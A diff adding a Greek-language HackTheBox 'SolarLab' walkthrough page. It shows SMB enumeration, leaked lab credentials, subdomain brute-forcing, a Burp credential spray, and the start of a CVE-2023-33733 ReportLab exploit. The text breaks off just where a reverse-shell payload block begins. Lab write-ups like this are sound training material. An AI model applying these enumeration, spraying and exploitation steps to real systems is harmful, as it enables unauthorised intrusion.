@@ -1,0 +1,763 @@
+<!DOCTYPE html>
+<html lang="el">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="Content-Security-Policy" content="default-src 'self'; base-uri 'self'; form-action 'self'; object-src 'none'; script-src 'self' https://static.cloudflareinsights.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com; img-src 'self' data:; connect-src 'self' https://cloudflareinsights.com; worker-src 'self' blob:;">
+<meta name="referrer" content="strict-origin-when-cross-origin">
+<style>.writeup-back-link:hover{transform:translateX(-2px);background:rgba(26,26,24,1)!important;}</style>
+<title>HTB: SolarLab &#8212; S. Markakis</title>
+<meta name="description" content="HackTheBox SolarLab machine walkthrough — full writeup with screenshots.">
+<meta property="og:title" content="HTB: SolarLab — S. Markakis">
+<meta property="og:description" content="HackTheBox SolarLab machine walkthrough — full writeup with screenshots.">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://s-markakis.github.io/writeups/htb-solarlab-el.html">
+<meta property="og:image" content="https://s-markakis.github.io/writeups/assets/og/htb-solarlab.png">
+<meta property="og:locale" content="el_GR">
+<meta property="og:locale:alternate" content="en_US">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://s-markakis.github.io/writeups/assets/og/htb-solarlab.png">
+<link rel="canonical" href="https://s-markakis.github.io/writeups/htb-solarlab-el.html">
+<link rel="alternate" hreflang="en" href="https://s-markakis.github.io/writeups/htb-solarlab.html">
+<link rel="alternate" hreflang="el" href="https://s-markakis.github.io/writeups/htb-solarlab-el.html">
+<link rel="alternate" hreflang="x-default" href="https://s-markakis.github.io/writeups/htb-solarlab.html">
+
+
+
+
+
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Barlow+Condensed:wght@700;800&family=Barlow:wght@400;500;600&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../style.css">
+<style>
+  :root {
+    --bg:        #eae8e3;
+    --bg-code:   #dddbd5;
+    --bg-term:   #d4d2cc;
+    --text:      #888880;
+    --text-dark: #1a1a18;
+    --text-mid:  #555550;
+    --border:    #c8c6c0;
+    --tag-bg:    #d8d6d0;
+    --tag-text:  #555550;
+    --accent:    #1a1a18;
+    /* terminal colors — muted to stay on-brand */
+    --t-user:    #4a7c59;
+    --t-host:    #5a6e8a;
+    --t-path:    #7a6040;
+    --t-cmd:     #1a1a18;
+    --t-out:     #666660;
+    --t-yellow:  #8a7030;
+    --t-red:     #8a3030;
+    --t-green:   #3a6a48;
+    --t-comment: #aaa89f;
+    --t-blue:    #3a5a7a;
+  }
+
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  html { scroll-behavior: smooth; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Barlow', sans-serif;
+    font-size: 17px;
+    line-height: 1.75;
+    -webkit-font-smoothing: antialiased;
+  }
+
+  /* ── NAV ── */
+
+  /* ── WRAPPER ── */
+  .wrapper {
+    position: relative;
+    z-index: 1;
+    width: 100%;
+    max-width: 780px;
+    margin: 0 auto;
+    padding: 4rem 2rem 8rem;
+  }
+
+  /* ── POST HEADER ── */
+  .post-header { margin-bottom: 2.5rem; }
+
+  h1 {
+    font-family: 'Barlow Condensed', sans-serif;
+    font-weight: 800;
+    font-size: 3.2rem;
+    line-height: 1.05;
+    color: var(--text-dark);
+    letter-spacing: -.01em;
+    margin-bottom: 1rem;
+  }
+
+  .post-meta {
+    display: flex;
+    align-items: center;
+    gap: 1rem;
+    font-size: 0.85rem;
+    color: var(--text);
+    flex-wrap: wrap;
+  }
+  .post-meta .date { color: var(--text); }
+
+  .tag {
+    background: var(--tag-bg);
+    color: var(--tag-text);
+    font-size: 0.72rem;
+    font-weight: 600;
+    letter-spacing: .08em;
+    text-transform: uppercase;
+    padding: .2rem .6rem;
+    border-radius: 3px;
+  }
+  .tag-htb  { background: #c8d8c0; color: #2a4a28; }
+  .tag-ssti { background: #d8c8b8; color: #5a3a18; }
+
+  .divider {
+    border: none;
+    border-top: 1px solid var(--border);
+    margin: 2rem 0;
+  }
+
+  /* ── OVERVIEW BOX ── */
+  .overview {
+    background: var(--bg-code);
+    border-left: 3px solid var(--text-dark);
+    padding: 1.2rem 1.5rem;
+    margin: 2rem 0;
+    font-size: 0.95rem;
+    line-height: 1.7;
+    color: var(--text-mid);
+  }
+
+  /* ── ATTACK CHAIN ── */
+  .chain {
+    display: flex;
+    flex-wrap: wrap;
+    align-items: center;
+    gap: .4rem;
+    background: var(--bg-code);
+    border: 1px solid var(--border);
+    padding: .9rem 1.2rem;
+    border-radius: 4px;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.78rem;
+    margin: 1.5rem 0 2.5rem;
+    color: var(--text-mid);
+  }
+  .chain-node {
+    background: var(--bg);
+    border: 1px solid var(--border);
+    color: var(--text-dark);
+    padding: .2rem .7rem;
+    border-radius: 3px;
+    font-weight: 500;
+  }
+  .chain-arrow { color: var(--text); }
+
+  /* ── HEADINGS ── */
+  h2 {
+    font-family: 'Barlow Condensed', sans-serif;
+    font-weight: 800;
+    font-size: 1.9rem;
+    color: var(--text-dark);
+    margin: 3rem 0 .8rem;
+    letter-spacing: -.01em;
+  }
+
+  h3 {
+    font-family: 'Barlow', sans-serif;
+    font-weight: 600;
+    font-size: 1.1rem;
+    color: var(--text-dark);
+    margin: 2rem 0 .6rem;
+  }
+
+  p {
+    color: var(--text);
+    margin-bottom: 1rem;
+  }
+
+  strong { color: var(--text-dark); font-weight: 600; }
+
+  a { color: var(--text-mid); }
+
+  /* ── INLINE CODE ── */
+  code {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.82em;
+    background: var(--bg-code);
+    border: 1px solid var(--border);
+    color: var(--text-mid);
+    padding: .1em .4em;
+    border-radius: 3px;
+  }
+
+  /* ── TERMINAL BLOCK ── */
+  .terminal {
+    background: var(--bg-term);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    margin: 1.4rem 0;
+    overflow: hidden;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.8rem;
+    line-height: 1.65;
+  }
+  .term-bar {
+    background: var(--bg-code);
+    border-bottom: 1px solid var(--border);
+    padding: .45rem 1rem;
+    display: flex;
+    align-items: center;
+    gap: .4rem;
+  }
+  .dot { width: 11px; height: 11px; border-radius: 50%; }
+  .dr { background: #c07070; }
+  .dy { background: #b8a050; }
+  .dg { background: #60a070; }
+  .term-label {
+    margin-left: auto;
+    font-size: 0.7rem;
+    color: var(--text);
+    letter-spacing: .05em;
+  }
+  .term-body {
+    padding: 1rem 1.3rem;
+    overflow-x: auto;
+    white-space: pre;
+  }
+
+  /* prompt colors — muted to match cream palette */
+  .pu  { color: var(--t-user);    font-weight: 700; }
+  .ph  { color: var(--t-host);    font-weight: 700; }
+  .pp  { color: var(--t-path); }
+  .ps  { color: var(--t-comment); }
+  .pd  { color: var(--text-mid); }
+  .pc  { color: var(--t-cmd);     font-weight: 500; }
+  .po  { color: var(--t-out); }
+  .py  { color: var(--t-yellow); }
+  .pr  { color: var(--t-red); }
+  .pg  { color: var(--t-green); }
+  .pb  { color: var(--t-blue); }
+  .pco { color: var(--t-comment); }
+
+  /* ── ALERT BOXES ── */
+  .alert {
+    padding: .9rem 1.2rem;
+    margin: 1.4rem 0;
+    border-left: 3px solid;
+    font-size: 0.92rem;
+    border-radius: 0 4px 4px 0;
+  }
+  .alert-info    { background: #d8dde8; border-color: var(--t-blue);  color: #2a3a5a; }
+  .alert-warn    { background: #e8e0c8; border-color: var(--t-yellow); color: #5a4010; }
+  .alert-success { background: #d0ddd0; border-color: var(--t-green); color: #1a3a20; }
+
+  /* ── TABLE ── */
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    margin: 1.4rem 0;
+    font-size: 0.88rem;
+  }
+  th {
+    text-align: left;
+    padding: .55rem 1rem;
+    font-family: 'Barlow Condensed', sans-serif;
+    font-weight: 700;
+    font-size: 0.8rem;
+    letter-spacing: .08em;
+    text-transform: uppercase;
+    color: var(--text-mid);
+    border-bottom: 2px solid var(--border);
+    background: var(--bg-code);
+  }
+  td {
+    padding: .5rem 1rem;
+    border-bottom: 1px solid var(--border);
+    color: var(--text);
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.78rem;
+  }
+  tr:hover td { background: var(--bg-code); }
+
+  /* ── LISTS ── */
+  ul { padding-left: 1.5rem; margin-bottom: 1rem; }
+  li { color: var(--text); margin-bottom: .3rem; }
+
+  /* ── SUMMARY TABLE special cols ── */
+  .st td:nth-child(1) { color: var(--text-dark); font-weight: 600; }
+  .st td:nth-child(2) { color: var(--text-mid); }
+
+  /* ── FOOTER ── */
+  footer {
+    border-top: 1px solid var(--border);
+    padding: 2rem 3rem;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    font-size: 0.82rem;
+    color: var(--text);
+  }
+  footer a { color: var(--text-mid); text-decoration: none; }
+  footer a:hover { color: var(--text-dark); }
+
+  /* ── BACK LINK ── */
+  .back {
+    display: inline-flex;
+    align-items: center;
+    gap: .4rem;
+    font-size: 0.85rem;
+    color: var(--text);
+    text-decoration: none;
+    margin-bottom: 2.5rem;
+    transition: color .15s;
+  }
+  .back:hover { color: var(--text-dark); }
+
+  @media (max-width: 600px) {
+    nav { padding: 1rem 1.2rem; }
+    .wrapper { padding: 2rem 1.2rem 5rem; }
+    h1 { font-size: 2.4rem; }
+  }
+</style>
+<script src="../js/theme.js"></script>
+<style>
+  body.dark {
+    --bg:#0f0f0f; --bg-code:#161616; --bg-term:#161616; --border:#2a2a2a;
+    --text:#959086; --text-dark:#f4f3ef; --text-mid:#d4d2cc;
+    --tag-bg:#1e1e1e; --tag-text:#999690; --accent:#f4f3ef;
+    --t-user:#6a9c79; --t-host:#7a8eaa; --t-path:#9a8060; --t-cmd:#f4f3ef;
+    --t-out:#a6a69c; --t-yellow:#aa9050; --t-red:#aa5050; --t-green:#5a8a68;
+    --t-comment:#7a7870; --t-blue:#5a7a9a;
+  }
+</style>
+<style>
+  .htb-cta{display:flex;gap:.6rem;flex-wrap:wrap;margin:1.5rem 0}
+  .htb-cta.top{margin-top:.4rem}
+  .htb-cta a{flex:1 1 220px;display:flex;align-items:center;gap:.75rem;padding:.75rem .9rem;background:var(--bg-code);border:1px solid var(--border);border-radius:8px;text-decoration:none;color:var(--text-dark);font-family:'Barlow',sans-serif;transition:transform .15s,border-color .15s,background .15s}
+  .htb-cta a:hover{transform:translateY(-2px);border-color:var(--text-dark);background:var(--bg-term)}
+  .htb-cta svg{width:20px;height:20px;flex:none;stroke:var(--text-dark);fill:none;stroke-width:2;stroke-linecap:round;stroke-linejoin:round}
+  .htb-cta .l-t{display:block;font-family:'Barlow Condensed',sans-serif;font-weight:600;font-size:1.02rem;letter-spacing:.01em;line-height:1.15;color:var(--text-dark)}
+  .htb-cta .l-s{display:block;font-size:.72rem;color:var(--text-mid);line-height:1.25}
+  .htb-cta .l-x{margin-left:auto;color:var(--text-mid);font-size:.95rem}
+</style>
+<script id="sp1r4-jsonld" type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "HTB: SolarLab",
+  "description": "HackTheBox SolarLab machine walkthrough — full writeup with screenshots.",
+  "datePublished": "2026-04-11",
+  "dateModified": "2026-04-11",
+  "inLanguage": "el",
+  "author": {
+    "@type": "Person",
+    "name": "S. Markakis",
+    "url": "https://s-markakis.github.io/"
+  },
+  "publisher": {
+    "@type": "Person",
+    "name": "S. Markakis",
+    "url": "https://s-markakis.github.io/"
+  },
+  "url": "https://s-markakis.github.io/writeups/htb-solarlab-el.html",
+  "image": "https://s-markakis.github.io/writeups/assets/og/htb-solarlab.png",
+  "keywords": [
+    "offensive",
+    "htb"
+  ],
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://s-markakis.github.io/blog.html#htb-solarlab"
+  },
+  "timeRequired": "PT6M"
+}
+</script>
+</head>
+<body class="has-nav">
+<nav id="site-nav"></nav>
+<a href="../blog.html" class="writeup-back-link" style="position:fixed;top:66px;left:18px;z-index:51;display:inline-flex;align-items:center;gap:8px;padding:8px 14px;background:rgba(26,26,24,0.92);color:#eae8e3;font-family:'Barlow',sans-serif;font-size:12px;font-weight:500;letter-spacing:0.04em;text-decoration:none;border-radius:4px;border:0.5px solid rgba(234,232,227,0.15);backdrop-filter:blur(8px);transition:transform 0.18s,background 0.18s;"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg>Πίσω στο blog</a>
+
+<div class="wrapper">
+
+  <a class="back" href="https://s-markakis.github.io/blog.html">&#8592; Πίσω στα posts</a>
+  <p style="font-size:.8rem;letter-spacing:.04em;color:var(--text-mid);margin-bottom:1.2rem;"><a href="htb-solarlab.html" style="font-weight:600;">English</a> &nbsp;·&nbsp; <strong style="color:var(--text-dark);">Ελληνικά</strong></p>
+
+  <div class="post-header">
+    <h1>HTB: SolarLab</h1>
+    <div class="post-meta">
+      <span class="date">9 Ιουνίου 2024</span>
+      <span class="tag tag-htb">HackTheBox</span>
+      <span class="tag tag-win" style="background:#c8d0e0;color:#1a2a5a;">Windows</span>
+      <span class="tag" style="background:#d8e0c8;color:#2a4a10;">Μεσαιο</span>
+      <span class="tag">CVE-2023-33733</span>
+      <span class="tag">CVE-2023-32315</span>
+      <span class="tag">Openfire</span>
+      <span>&nbsp;12 λεπτά αναγνωσης</span>
+    </div>
+  </div>
+
+  <div class="htb-cta top">
+  <a href="https://app.hackthebox.com/users/332355" target="_blank" rel="noopener">
+    <svg viewBox="0 0 24 24"><polygon points="12 2 22 8.5 22 15.5 12 22 2 15.5 2 8.5"/><line x1="12" y1="22" x2="12" y2="15.5"/><polyline points="22 8.5 12 15.5 2 8.5"/></svg>
+    <span><span class="l-t">HackTheBox</span><span class="l-s">My HTB profile &amp; more boxes</span></span>
+    <span class="l-x">↗</span>
+  </a>
+  <a href="https://github.com/s-markakis" target="_blank" rel="noopener">
+    <svg viewBox="0 0 24 24"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"/></svg>
+    <span><span class="l-t">GitHub</span><span class="l-s">Open-source security &amp; automation tools</span></span>
+    <span class="l-x">↗</span>
+  </a>
+</div>
+
+  <hr class="divider">
+
+  <div class="overview">
+    Το SolarLab ξεκινάει με SMB enumeration που αποκαλύπτει ένα αρχείο Excel με usernames και passwords. Μετά από ανακάλυψη subdomain και credential spraying πάνω στο <strong>ReportHub</strong>, εκμεταλλευόμαστε το <strong>CVE-2023-33733</strong> (ReportLab RCE μέσω HTML-to-PDF injection) για foothold ως <code>blake</code>. Η πλευρική κίνηση προς τον χρήστη <code>openfire</code> περνάει μέσα από το <strong>CVE-2023-32315</strong> (Openfire auth bypass). Το root επιτυγχάνεται αποκρυπτογραφώντας τον κωδικό admin του Openfire από την embedded database χρησιμοποιώντας ένα κλειδί blowfish.
+  </div>
+
+  <div class="chain">
+    <span class="chain-node">SMB &#8594; xlsx creds</span>
+    <span class="chain-arrow">&#8594;</span>
+    <span class="chain-node">ReportHub (BlakeB)</span>
+    <span class="chain-arrow">&#8594;</span>
+    <span class="chain-node">blake (CVE-2023-33733)</span>
+    <span class="chain-arrow">&#8594;</span>
+    <span class="chain-node">openfire (CVE-2023-32315)</span>
+    <span class="chain-arrow">&#8594;</span>
+    <span class="chain-node">Administrator (Openfire decrypt)</span>
+  </div>
+
+  <h2>Αναγνώριση</h2>
+  <h3>Nmap</h3>
+  <p>Το αρχικό σάρωμα αποκαλύπτει ports HTTP, SMB, RPC πάνω σε host Windows. Ένα πλήρες σάρωμα port βρίσκει επιπλέον το port <strong>6791</strong> να τρέχει HTTP:</p>
+
+<picture data-img-optimized="1"><source srcset="assets/htb-solarlab/img-01-3a6df53312.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-solarlab/img-01-3a6df53312.png" style="max-width:100%;height:auto;display:block;margin:1rem auto;border-radius:6px;border:1px solid var(--border);" alt="Nmap initial scan results" width="700" height="190"></picture>
+<picture data-img-optimized="1"><source srcset="assets/htb-solarlab/img-02-a83cfc9a74.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-solarlab/img-02-a83cfc9a74.png" style="max-width:100%;height:auto;display:block;margin:1rem auto;border-radius:6px;border:1px solid var(--border);" alt="Nmap full port scan showing port 6791" width="640" height="217"></picture>
+
+  <p>Προσθέτουμε το <code>solarlab.htb</code> στο <code>/etc/hosts</code>:</p>
+
+<picture data-img-optimized="1"><source srcset="assets/htb-solarlab/img-03-2313917de1.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-solarlab/img-03-2313917de1.png" style="max-width:100%;height:auto;display:block;margin:1rem auto;border-radius:6px;border:1px solid var(--border);" alt="/etc/hosts with solarlab.htb" width="720" height="461"></picture>
+
+  <h2>SMB Enumeration</h2>
+  <p>Ελέγχουμε τα SMB shares ανώνυμα:</p>
+
+<picture data-img-optimized="1"><source srcset="assets/htb-solarlab/img-04-bb4dafd837.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-solarlab/img-04-bb4dafd837.png" style="max-width:100%;height:auto;display:block;margin:1rem auto;border-radius:6px;border:1px solid var(--border);" alt="SMB share listing showing Documents share" width="720" height="222"></picture>
+
+  <p>Το share <code>Documents</code> είναι προσβάσιμο. Περιέχει αρκετά ενδιαφέροντα αρχεία:</p>
+
+<picture data-img-optimized="1"><source srcset="assets/htb-solarlab/img-05-ab38d061fe.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-solarlab/img-05-ab38d061fe.png" style="max-width:100%;height:auto;display:block;margin:1rem auto;border-radius:6px;border:1px solid var(--border);" alt="SMB Documents share contents" width="720" height="310"></picture>
+
+  <div class="terminal">
+    <div class="term-bar"><span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span><span class="term-label">smbclient &#8212; κατέβασμα όλων</span></div>
+    <div class="term-body"><span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~/Documents/HTB/solarlab</span><span class="ps">]</span>
+<span class="pd">&#9492;$ </span><span class="pc">smbclient -N //solarlab.htb/Documents</span>
+<span class="po">smb: \&gt; mget *</span></div>
+  </div>
+
+<picture data-img-optimized="1"><source srcset="assets/htb-solarlab/img-06-22f184f410.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-solarlab/img-06-22f184f410.png" style="max-width:100%;height:auto;display:block;margin:1rem auto;border-radius:6px;border:1px solid var(--border);" alt="Downloaded files: details-file.xlsx, old_leave_request_form.docx, etc." width="720" height="221"></picture>
+
+  <h3>details-file.xlsx</h3>
+  <p>Το αρχείο Excel περιέχει usernames, passwords, ερωτήσεις ασφαλείας, και email addresses. Οι πιο χρήσιμες εγγραφές:</p>
+
+<picture data-img-optimized="1"><source srcset="assets/htb-solarlab/img-07-a3d61ab355.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-solarlab/img-07-a3d61ab355.png" style="max-width:100%;height:auto;display:block;margin:1rem auto;border-radius:6px;border:1px solid var(--border);" alt="details-file.xlsx contents with credentials" width="720" height="393"></picture>
+
+  <div class="alert alert-info">
+    Βασικά credentials που εξήχθησαν:<br>
+    <code>KAlexander</code> / <code>al;ksdhfewoiuh</code><br>
+    <code>AlexanderK</code> / <code>dkjafblkjadsfgl</code><br>
+    <code>ClaudiaS</code> / <code>dadsfawe9dafkn</code> / <code>danenacia9234n</code><br>
+    <code>blake.byte</code> / <code>ThisCanB3typedeasily1@</code>
+  </div>
+
+  <h2>Web Enumeration</h2>
+  <p>Το port 80 σερβίρει <strong>SolarLab IM</strong> — μια σελίδα coming-soon με αντίστροφη μέτρηση, χωρίς χρήσιμο περιεχόμενο:</p>
+
+<picture data-img-optimized="1"><source srcset="assets/htb-solarlab/img-08-8b7923c0ff.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-solarlab/img-08-8b7923c0ff.png" style="max-width:100%;height:auto;display:block;margin:1rem auto;border-radius:6px;border:1px solid var(--border);" alt="SolarLab IM website on port 80" width="644" height="268"></picture>
+
+  <h3>Subdomain brute-force</h3>
+  <div class="terminal">
+    <div class="term-bar"><span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span><span class="term-label">gobuster dns</span></div>
+    <div class="term-body"><span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~/Documents/HTB/solarlab</span><span class="ps">]</span>
+<span class="pd">&#9492;$ </span><span class="pc">gobuster dns -d solarlab.htb -o gobuster_dns.log -w /opt/wordlists/seclist/Discovery/DNS/subdomains-top1million-10000.txt -t 100</span>
+<span class="pg">Found: report.solarlab.htb</span></div>
+  </div>
+
+<picture data-img-optimized="1"><source srcset="assets/htb-solarlab/img-09-01906c8e05.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-solarlab/img-09-01906c8e05.png" style="max-width:100%;height:auto;display:block;margin:1rem auto;border-radius:6px;border:1px solid var(--border);" alt="Gobuster DNS finding report.solarlab.htb" width="720" height="246"></picture>
+
+  <p>Το port <strong>6791</strong> κάνει επίσης redirect αυτόματα στο <code>report.solarlab.htb</code>. Το προσθέτουμε στο <code>/etc/hosts</code>:</p>
+
+<picture data-img-optimized="1"><source srcset="assets/htb-solarlab/img-10-8610dc64f5.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-solarlab/img-10-8610dc64f5.png" style="max-width:100%;height:auto;display:block;margin:1rem auto;border-radius:6px;border:1px solid var(--border);" alt="Burp showing unknown host error before adding to hosts" width="720" height="268"></picture>
+<picture data-img-optimized="1"><source srcset="assets/htb-solarlab/img-11-2910386743.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-solarlab/img-11-2910386743.png" style="max-width:100%;height:auto;display:block;margin:1rem auto;border-radius:6px;border:1px solid var(--border);" alt="/etc/hosts updated with report.solarlab.htb" width="720" height="233"></picture>
+
+  <h2>ReportHub &#8212; Επίθεση σε Credentials</h2>
+  <p>Το port 6791 σερβίρει μια σελίδα <strong>Login to ReportHub</strong>:</p>
+
+<picture data-img-optimized="1"><source srcset="assets/htb-solarlab/img-12-46fa5983c4.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-solarlab/img-12-46fa5983c4.png" style="max-width:100%;height:auto;display:block;margin:1rem auto;border-radius:6px;border:1px solid var(--border);" alt="ReportHub login page" width="720" height="372"></picture>
+
+  <p>Δοκιμάζοντας τα credentials από το xlsx — τα μηνύματα σφάλματος είναι συγκεκριμένα. Το <code>User not found</code> έναντι <code>User authentication error</code> επιτρέπει username enumeration. Οι <code>AlexanderK</code> και <code>ClaudiaS</code> υπάρχουν αλλά οι κωδικοί είναι λάθος:</p>
+
+<picture data-img-optimized="1"><source srcset="assets/htb-solarlab/img-13-bb7b6c91b4.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-solarlab/img-13-bb7b6c91b4.png" style="max-width:100%;height:auto;display:block;margin:1rem auto;border-radius:6px;border:1px solid var(--border);" alt="Login showing 'User not found' error" width="720" height="397"></picture>
+<picture data-img-optimized="1"><source srcset="assets/htb-solarlab/img-14-0699a0bb6c.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-solarlab/img-14-0699a0bb6c.png" style="max-width:100%;height:auto;display:block;margin:1rem auto;border-radius:6px;border:1px solid var(--border);" alt="Login showing 'User authentication error' — user exists" width="720" height="314"></picture>
+
+  <h3>Burp Intruder &#8212; credential spray</h3>
+  <p>Χρησιμοποιούμε το Burp Intruder με επίθεση cluster bomb για να συνδυάσουμε usernames και passwords:</p>
+
+<picture data-img-optimized="1"><source srcset="assets/htb-solarlab/img-15-d569ea6c8a.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-solarlab/img-15-d569ea6c8a.png" style="max-width:100%;height:auto;display:block;margin:1rem auto;border-radius:6px;border:1px solid var(--border);" alt="Burp Intruder cluster bomb setup" width="720" height="388"></picture>
+<picture data-img-optimized="1"><source srcset="assets/htb-solarlab/img-16-cb275c8a83.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-solarlab/img-16-cb275c8a83.png" style="max-width:100%;height:auto;display:block;margin:1rem auto;border-radius:6px;border:1px solid var(--border);" alt="Burp payload sets with usernames and passwords" width="720" height="390"></picture>
+<picture data-img-optimized="1"><source srcset="assets/htb-solarlab/img-17-47a4840176.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-solarlab/img-17-47a4840176.png" style="max-width:100%;height:auto;display:block;margin:1rem auto;border-radius:6px;border:1px solid var(--border);" alt="Burp intruder results — no valid combinations found" width="720" height="181"></picture>
+
+  <p>Δεν βρέθηκαν έγκυρα credentials στο πρώτο spray. Κοιτώντας πιο προσεκτικά το pattern των usernames — <code>AlexanderK</code>, <code>ClaudiaS</code> — υποδηλώνει <strong>Μικρό όνομα + αρχικό επωνύμου</strong>. Το xlsx δείχνει <code>blake.byte</code> οπότε το username θα πρέπει να είναι <strong>BlakeB</strong>:</p>
+
+<picture data-img-optimized="1"><source srcset="assets/htb-solarlab/img-18-94fd0f4736.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-solarlab/img-18-94fd0f4736.png" style="max-width:100%;height:auto;display:block;margin:1rem auto;border-radius:6px;border:1px solid var(--border);" alt="xlsx showing blake.byte with password ThisCanB3typedeasily1@" width="720" height="309"></picture>
+
+  <div class="terminal">
+    <div class="term-bar"><span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span><span class="term-label">Burp &#8212; hit BlakeB</span></div>
+    <div class="term-body"><span class="pco"># Μήκος request 660 (διαφορετικό από τα υπόλοιπα στο 2419) = έγκυρο login</span>
+<span class="pg">BlakeB : ThisCanB3typedeasily1@</span></div>
+  </div>
+
+<picture data-img-optimized="1"><source srcset="assets/htb-solarlab/img-19-f4bd3755c2.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-solarlab/img-19-f4bd3755c2.png" style="max-width:100%;height:auto;display:block;margin:1rem auto;border-radius:6px;border:1px solid var(--border);" alt="Burp results showing BlakeB with length 660 — valid hit" width="720" height="173"></picture>
+
+  <div class="alert alert-success">Έγκυρα credentials: <strong>BlakeB:ThisCanB3typedeasily1@</strong></div>
+
+  <h2>Foothold &#8212; CVE-2023-33733 (ReportLab RCE)</h2>
+  <p>Μετά το login, το ReportHub εκθέτει τέσσερα features — Leave Request, Training Request, Home Office Request, και Travel Approval. Όλα δημιουργούν PDFs:</p>
+
+<picture data-img-optimized="1"><source srcset="assets/htb-solarlab/img-20-d48b82be28.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-solarlab/img-20-d48b82be28.png" style="max-width:100%;height:auto;display:block;margin:1rem auto;border-radius:6px;border:1px solid var(--border);" alt="ReportHub dashboard with four request options" width="720" height="323"></picture>
+<picture data-img-optimized="1"><source srcset="assets/htb-solarlab/img-21-8096f237b8.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-solarlab/img-21-8096f237b8.png" style="max-width:100%;height:auto;display:block;margin:1rem auto;border-radius:6px;border:1px solid var(--border);" alt="Leave Request form with Generate PDF button" width="720" height="368"></picture>
+<picture data-img-optimized="1"><source srcset="assets/htb-solarlab/img-22-3554972358.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-solarlab/img-22-3554972358.png" style="max-width:100%;height:auto;display:block;margin:1rem auto;border-radius:6px;border:1px solid var(--border);" alt="Generated PDF output from leave request" width="720" height="388"></picture>
+<picture data-img-optimized="1"><source srcset="assets/htb-solarlab/img-23-855607ead0.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-solarlab/img-23-855607ead0.png" style="max-width:100%;height:auto;display:block;margin:1rem auto;border-radius:6px;border:1px solid var(--border);" alt="Training Request form" width="720" height="348"></picture>
+
+  <p>Ο generator PDF χρησιμοποιεί το <strong>ReportLab</strong> που είναι ευάλωτο στο <strong>CVE-2023-33733</strong> — HTML injection στο πεδίο justification οδηγεί σε RCE μέσω της μηχανής rendering PDF:</p>
+
+<picture data-img-optimized="1"><source srcset="assets/htb-solarlab/img-24-fdc1e5e2cf.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-solarlab/img-24-fdc1e5e2cf.png" style="max-width:100%;height:auto;display:block;margin:1rem auto;border-radius:6px;border:1px solid var(--border);" alt="Google search showing CVE-2023-33733 ReportLab RCE" width="720" height="288"></picture>
+<picture data-img-optimized="1"><source srcset="assets/htb-solarlab/img-25-5489834759.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-solarlab/img-25-5489834759.png" style="max-width:100%;height:auto;display:block;margin:1rem auto;border-radius:6px;border:1px solid var(--border);" alt="Burp request with CVE-2023-33733 payload injected into form field" width="720" height="296"></picture>
+
+  <p>Πυροδοτούμε ένα reverse shell μέσω ενός PowerShell download cradle ενσωματωμένου στο exploit:</p>
+
+  <div class="terminal">
+    <div class="term-bar"><span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span><span class="term-label">payload CVE-2023-33733</span></div>
